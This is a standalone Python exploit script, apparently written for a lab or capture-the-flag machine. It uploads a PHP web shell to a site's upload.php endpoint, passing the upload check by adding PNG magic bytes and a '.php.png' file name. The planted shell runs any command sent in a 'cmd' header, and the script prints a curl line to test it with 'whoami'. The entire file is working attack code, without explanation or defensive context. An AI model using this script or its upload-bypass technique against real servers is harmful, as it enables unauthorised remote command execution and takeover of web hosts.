#!/usr/bin/python3

import requests, sys, urllib

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage:\t python3 %s URL" % sys.argv[0])
        print("Example:\t python3 %s 'https://10.10.10.129:8080/'" % sys.argv[0])
        sys.exit(-1)

    file_uuid = "85c7e2c0-d9c7-40e1-a214-678558affffb"

    target = sys.argv[1]
    server_upload = f"{target}upload.php?id={file_uuid}"
    server_file = f"{target}upload/{file_uuid}.php"

    magic_bytes = "\x89\x50\x4e\x47\x0d\x0a\x1a"
    payload = f"""<?php system(getallheaders()["cmd"]); ?>"""
    files     = {
                'file': 
                  (
                    f"{file_uuid}.php.png", 
                    magic_bytes+'\n'+payload, 
                    "image/png", 
                    {"Content-Disposition": "form-data"}
                  ) 
              }
    fdata   = {"pupload": "upload"}

    res = requests.post(url=server_upload, files=files, data=fdata, verify=False)

    if (res.status_code != 200):
        print("Webshell could not be uploaded")
        sys.exit(-1)

    print("\nWeb shell uploaded to %s" % server_file)
    print("""\nSend the following curl request for testing: curl %s -H "cmd: whoami" """ % server_file)
